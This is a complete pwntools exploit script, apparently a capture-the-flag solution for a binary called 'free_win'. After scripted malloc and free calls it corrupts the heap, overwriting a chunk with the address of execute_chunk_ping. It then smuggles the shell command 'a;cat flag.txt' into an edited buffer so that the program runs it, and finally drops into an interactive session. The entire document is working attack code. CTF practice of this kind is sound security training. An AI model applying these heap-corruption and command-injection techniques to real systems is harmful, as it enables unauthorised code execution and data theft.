#!/usr/bin/python3

from pwn import *

exe = ELF('free_win', checksec=False)
# libc = ELF('libc-2.27.so', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* execute_chunk_ping + 1

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()


def malloc(index, size, buffer):
    sla(b">> ", b"1")
    sla(b">> ", index)
    sla(b">> ", size)
    sla(b">> ", buffer)


def free(index):
    sla(b">> ", b"2")
    sla(b">> ", index)


def edit(index, buffer):
    sla(b">> ", b"3")
    sla(b">> ", index)
    sa(b">> ", buffer)


def execute(index):
    sla(b">> ", b"4")
    sla(b">> ", index)


malloc(b"0", b"24", b"aaaaaa")
malloc(b"1", b"24", b"aaaaaa")
# malloc(b"2", b"16", b"aaaaaa")

free(b"1")
free(b"0")

payload = b"\0" * 32 + p64(exe.sym['execute_chunk_ping'])
malloc(b"0", b"56", payload)
edit(b"1", b"a;cat flag.txt\n")

execute(b"1")

p.interactive()
